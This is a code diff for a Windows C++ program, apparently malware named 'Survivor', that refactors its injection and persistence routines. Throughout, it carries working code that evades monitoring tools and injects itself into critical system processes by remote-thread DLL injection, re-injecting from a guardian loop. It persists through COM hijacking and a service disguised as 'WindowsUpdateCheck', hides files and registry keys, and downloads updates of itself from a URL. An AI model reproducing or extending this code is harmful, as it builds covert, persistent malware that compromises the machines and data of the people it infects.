@@ -88,6 +88,15 @@ static Config g_config;
 
 namespace utils {
 
+std::string WideToNarrow(const std::wstring& wide) {
+    if (wide.empty()) return std::string();
+    int size = WideCharToMultiByte(CP_ACP, 0, wide.c_str(), -1, NULL, 0, NULL, NULL);
+    if (size <= 0) return std::string();
+    std::string narrow(size - 1, 0);
+    WideCharToMultiByte(CP_ACP, 0, wide.c_str(), -1, &narrow[0], size, NULL, NULL);
+    return narrow;
+}
+
 std::string GetEnv(const char* name) {
     char buf[MAX_ENV_BUFFER];
     DWORD result = GetEnvironmentVariableA(name, buf, sizeof(buf));
@@ -291,7 +300,7 @@ bool IsBeingMonitored() {
     if (Process32FirstW(snap, &pe)) {
         do {
             std::wstring name(pe.szExeFile);
-            std::string narrow(name.begin(), name.end());
+            std::string narrow = utils::WideToNarrow(name);
             std::transform(narrow.begin(), narrow.end(), narrow.begin(), ::tolower);
             for (const char* tool : tools) {
                 std::string tool_lower = tool;
@@ -352,10 +361,9 @@ bool IsRunningAsAdmin() {
     HANDLE token = NULL;
 
     if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
-        DWORD needed;
-        GetTokenInformation(token, TokenGroups, NULL, 0, &needed);
-
-        tg = static_cast<TOKEN_GROUPS*>(malloc(needed));
+        DWORD needed = 0;
+        if (GetTokenInformation(token, TokenGroups, NULL, 0, &needed) || GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
+            tg = static_cast<TOKEN_GROUPS*>(malloc(needed));
         if (tg && GetTokenInformation(token, TokenGroups, tg, needed, &needed)) {
             for (DWORD i = 0; i < tg->GroupCount; ++i) {
                 SID_IDENTIFIER_AUTHORITY sia = SECURITY_NT_AUTHORITY;
@@ -371,6 +379,7 @@ bool IsRunningAsAdmin() {
             }
         }
         if (tg) free(tg);
+        } // 闭合 if (GetTokenInformation(...) || GetLastError() == ERROR_INSUFFICIENT_BUFFER)
         CloseHandle(token);
     }
 
@@ -393,10 +402,10 @@ bool IsCriticalProcess(const std::string& name) {
 
 namespace injection {
 
-DWORD FindProcessId(const std::string& target) {
+bool InjectIntoProcess(const std::string& target, const std::string& selfPath) {
     DWORD pid = 0;
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snap == INVALID_HANDLE_VALUE) return 0;
+    if (snap == INVALID_HANDLE_VALUE) return false;
 
     PROCESSENTRY32W pe;
     pe.dwSize = sizeof(PROCESSENTRY32W);
@@ -404,7 +413,7 @@ DWORD FindProcessId(const std::string& target) {
     if (Process32FirstW(snap, &pe)) {
         do {
             std::wstring name(pe.szExeFile);
-            std::string narrow(name.begin(), name.end());
+            std::string narrow = utils::WideToNarrow(name);
             if (narrow == target || narrow.find(target) != std::string::npos) {
                 pid = pe.th32ProcessID;
                 break;
@@ -412,21 +421,20 @@ DWORD FindProcessId(const std::string& target) {
         } while (Process32NextW(snap, &pe));
     }
     CloseHandle(snap);
-    return pid;
-}
 
-bool InjectIntoProcess(DWORD pid, const std::string& payload) {
+    if (pid == 0) return false;
+
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess) return false;
 
-    size_t pathLen = payload.size() + 1;
+    size_t pathLen = selfPath.size() + 1;
     LPVOID alloc = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT, PAGE_READWRITE);
     if (!alloc) {
         CloseHandle(hProcess);
         return false;
     }
 
-    WriteProcessMemory(hProcess, alloc, payload.c_str(), pathLen, NULL);
+    WriteProcessMemory(hProcess, alloc, selfPath.c_str(), pathLen, NULL);
 
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
         reinterpret_cast<LPTHREAD_START_ROUTINE>(LoadLibraryA), alloc, 0, NULL);
@@ -441,11 +449,6 @@ bool InjectIntoProcess(DWORD pid, const std::string& payload) {
     return hThread != NULL;
 }
 
-bool InjectIntoProcess(const std::string& target, const std::string& selfPath) {
-    DWORD pid = FindProcessId(target);
-    return pid ? InjectIntoProcess(pid, selfPath) : false;
-}
-
 bool InjectIntoCriticalProcesses(const std::string& selfPath) {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) return false;
@@ -457,10 +460,10 @@ bool InjectIntoCriticalProcesses(const std::string& selfPath) {
     if (Process32FirstW(snap, &pe)) {
         do {
             std::wstring name(pe.szExeFile);
-            std::string narrow(name.begin(), name.end());
+            std::string narrow = utils::WideToNarrow(name);
 
             if (detection::IsCriticalProcess(narrow)) {
-                if (InjectIntoProcess(pe.th32ProcessID, selfPath)) {
+                if (InjectIntoProcess(narrow, selfPath)) {
                     success = true;
                     std::this_thread::sleep_for(std::chrono::seconds(1));
                 }
@@ -1015,7 +1018,7 @@ void GuardianLoop() {
         if (Process32FirstW(snap, &pe)) {
             do {
                 std::wstring name(pe.szExeFile);
-                std::string narrow(name.begin(), name.end());
+                std::string narrow = utils::WideToNarrow(name);
 
                 if (detection::IsCriticalProcess(narrow)) {
                     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
@@ -1024,8 +1027,7 @@ void GuardianLoop() {
                         if (!GetExitCodeProcess(hProcess, &exitCode) || exitCode != STILL_ACTIVE) {
                             CloseHandle(hProcess);
                             injection::InjectIntoCriticalProcesses(selfPath);
-                            CloseHandle(snap);
-                            return;
+                            break;
                         }
                         CloseHandle(hProcess);
                     }
@@ -1461,13 +1463,58 @@ bool RemovePermanentEventConsumer() {
 
 namespace dll {
 
+bool CreatePayloadDLL(const std::string& outputPath, const std::string&) {
+    return false;
+}
+
 bool InjectDLL(const std::string& dllPath, DWORD pid) {
-    return injection::InjectIntoProcess(pid, dllPath);
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess) return false;
+
+    size_t pathLen = dllPath.size() + 1;
+    LPVOID alloc = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT, PAGE_READWRITE);
+    if (!alloc) {
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    WriteProcessMemory(hProcess, alloc, dllPath.c_str(), pathLen, NULL);
+
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+        reinterpret_cast<LPTHREAD_START_ROUTINE>(LoadLibraryA), alloc, 0, NULL);
+
+    if (hThread) {
+        WaitForSingleObject(hThread, INFINITE);
+        VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
+        CloseHandle(hThread);
+    }
+
+    CloseHandle(hProcess);
+    return hThread != NULL;
 }
 
 bool InjectDLLIntoProcess(const std::string& processName, const std::string& dllPath) {
-    DWORD pid = injection::FindProcessId(processName);
-    return pid ? InjectDLL(dllPath, pid) : false;
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return false;
+
+    PROCESSENTRY32W pe;
+    pe.dwSize = sizeof(PROCESSENTRY32W);
+
+    DWORD pid = 0;
+    if (Process32FirstW(snap, &pe)) {
+        do {
+            std::wstring name(pe.szExeFile);
+            std::string narrow = utils::WideToNarrow(name);
+            if (narrow == processName || narrow.find(processName) != std::string::npos) {
+                pid = pe.th32ProcessID;
+                break;
+            }
+        } while (Process32NextW(snap, &pe));
+    }
+    CloseHandle(snap);
+
+    if (pid == 0) return false;
+    return InjectDLL(dllPath, pid);
 }
 
 }
@@ -1477,7 +1524,7 @@ namespace update {
 bool DownloadAndUpdate(const std::string& url, const std::string& destPath) {
     std::string tempPath = destPath + ".tmp";
 
-    HINTERNET hInternet = InternetOpenA("Survivor/2.2.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    HINTERNET hInternet = InternetOpenA(("Survivor/" + std::string(VERSION)).c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) return false;
 
     HINTERNET hFile = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
@@ -1511,7 +1558,7 @@ bool DownloadAndUpdate(const std::string& url, const std::string& destPath) {
 }
 
 bool CheckForUpdate(const std::string& url) {
-    HINTERNET hInternet = InternetOpenA("Survivor/2.2.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    HINTERNET hInternet = InternetOpenA(("Survivor/" + std::string(VERSION)).c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) return false;
 
     HINTERNET hFile = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
@@ -1532,7 +1579,7 @@ bool CheckForUpdate(const std::string& url) {
     InternetCloseHandle(hFile);
     InternetCloseHandle(hInternet);
 
-    return version.find("2.2.0") == std::string::npos;
+    return version.find(VERSION) == std::string::npos;
 }
 
 }
@@ -1625,12 +1672,6 @@ std::string DecryptMessage(const std::string& data) {
 
 namespace com {
 
-const char* COM_OBJECTS[] = {
-    "{B5F8350B-0548-48B1-A6EE-F85C1B1B6BD4}",
-    "{9A2B3C4D-5E6F-7A8B-9C0D-1E2F3A4B5C6D}",
-    "{1A2B3C4D-5E6F-7A8B-9C0D-1E2F3A4B5C6E}"
-};
-
 bool HijackCOM(const std::string& clsid, const std::string& dllPath) {
     HKEY hKey;
     std::string keyPath = "Software\\Classes\\CLSID\\" + clsid + "\\InprocServer32";
@@ -1651,18 +1692,34 @@ bool HijackCOM(const std::string& clsid, const std::string& dllPath) {
 }
 
 bool InstallCOMPersistence(const std::string& exePath) {
+    const char* comObjects[] = {
+        "{B5F8350B-0548-48B1-A6EE-F85C1B1B6BD4}",
+        "{9A2B3C4D-5E6F-7A8B-9C0D-1E2F3A4B5C6D}",
+        "{1A2B3C4D-5E6F-7A8B-9C0D-1E2F3A4B5C6E}"
+    };
+
     bool success = true;
-    for (const char* clsid : COM_OBJECTS) {
-        if (!HijackCOM(clsid, exePath)) success = false;
+    for (const char* clsid : comObjects) {
+        if (!HijackCOM(clsid, exePath)) {
+            success = false;
+        }
     }
     return success;
 }
 
 bool RemoveCOMPersistence() {
+    const char* comObjects[] = {
+        "{B5F8350B-0548-48B1-A6EE-F85C1B1B6BD4}",
+        "{9A2B3C4D-5E6F-7A8B-9C0D-1E2F3A4B5C6D}",
+        "{1A2B3C4D-5E6F-7A8B-9C0D-1E2F3A4B5C6E}"
+    };
+
     bool success = true;
-    for (const char* clsid : COM_OBJECTS) {
+    for (const char* clsid : comObjects) {
         std::string keyPath = "Software\\Classes\\CLSID\\" + std::string(clsid) + "\\InprocServer32";
-        if (RegDeleteTreeA(HKEY_CURRENT_USER, keyPath.c_str()) != ERROR_SUCCESS) success = false;
+        if (RegDeleteTreeA(HKEY_CURRENT_USER, keyPath.c_str()) != ERROR_SUCCESS) {
+            success = false;
+        }
     }
     return success;
 }
@@ -1697,18 +1754,19 @@ bool HideFromProcessList(DWORD pid) {
     return false;
 }
 
-bool SetFileVisibility(const std::string& path, bool hide) {
+bool HideFile(const std::string& path) {
     std::wstring wpath(path.begin(), path.end());
     DWORD attrs = GetFileAttributesW(wpath.c_str());
     if (attrs == INVALID_FILE_ATTRIBUTES) return false;
-
-    DWORD newAttrs = hide ? (attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
-                          : (attrs & ~(FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM));
-    return SetFileAttributesW(wpath.c_str(), newAttrs) != 0;
+    return SetFileAttributesW(wpath.c_str(), attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM) != 0;
 }
 
-bool HideFile(const std::string& path) { return SetFileVisibility(path, true); }
-bool UnhideFile(const std::string& path) { return SetFileVisibility(path, false); }
+bool UnhideFile(const std::string& path) {
+    std::wstring wpath(path.begin(), path.end());
+    DWORD attrs = GetFileAttributesW(wpath.c_str());
+    if (attrs == INVALID_FILE_ATTRIBUTES) return false;
+    return SetFileAttributesW(wpath.c_str(), attrs & ~(FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) != 0;
+}
 
 bool HideRegistryKey(const std::string& keyPath) {
     HKEY hKey;
@@ -1742,16 +1800,8 @@ bool HideRegistryKey(const std::string& keyPath) {
 
 namespace service {
 
-SC_HANDLE OpenSCM() {
-    return OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-}
-
-SC_HANDLE OpenService(SC_HANDLE hSCManager, DWORD access = SERVICE_ALL_ACCESS) {
-    return OpenServiceA(hSCManager, "WindowsUpdateCheck", access);
-}
-
 bool InstallService() {
-    SC_HANDLE hSCManager = OpenSCM();
+    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (!hSCManager) return false;
 
     std::string exePath = utils::GetSelfPath();
@@ -1759,17 +1809,21 @@ bool InstallService() {
         SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
         exePath.c_str(), NULL, NULL, NULL, NULL, NULL);
 
-    bool result = hService != NULL;
-    if (hService) CloseServiceHandle(hService);
+    if (!hService) {
+        CloseServiceHandle(hSCManager);
+        return false;
+    }
+
+    CloseServiceHandle(hService);
     CloseServiceHandle(hSCManager);
-    return result;
+    return true;
 }
 
 bool UninstallService() {
-    SC_HANDLE hSCManager = OpenSCM();
+    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (!hSCManager) return false;
 
-    SC_HANDLE hService = OpenService(hSCManager);
+    SC_HANDLE hService = OpenServiceA(hSCManager, "WindowsUpdateCheck", SERVICE_ALL_ACCESS);
     if (!hService) {
         CloseServiceHandle(hSCManager);
         return false;
@@ -1782,10 +1836,10 @@ bool UninstallService() {
 }
 
 bool StartService() {
-    SC_HANDLE hSCManager = OpenSCM();
+    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (!hSCManager) return false;
 
-    SC_HANDLE hService = OpenService(hSCManager);
+    SC_HANDLE hService = OpenServiceA(hSCManager, "WindowsUpdateCheck", SERVICE_ALL_ACCESS);
     if (!hService) {
         CloseServiceHandle(hSCManager);
         return false;
@@ -1798,10 +1852,10 @@ bool StartService() {
 }
 
 bool StopService() {
-    SC_HANDLE hSCManager = OpenSCM();
+    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (!hSCManager) return false;
 
-    SC_HANDLE hService = OpenService(hSCManager);
+    SC_HANDLE hService = OpenServiceA(hSCManager, "WindowsUpdateCheck", SERVICE_ALL_ACCESS);
     if (!hService) {
         CloseServiceHandle(hSCManager);
         return false;
@@ -1815,10 +1869,10 @@ bool StopService() {
 }
 
 bool IsServiceInstalled() {
-    SC_HANDLE hSCManager = OpenSCM();
+    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (!hSCManager) return false;
 
-    SC_HANDLE hService = OpenService(hSCManager, SERVICE_QUERY_CONFIG);
+    SC_HANDLE hService = OpenServiceA(hSCManager, "WindowsUpdateCheck", SERVICE_QUERY_CONFIG);
     if (!hService) {
         CloseServiceHandle(hSCManager);
         return false;
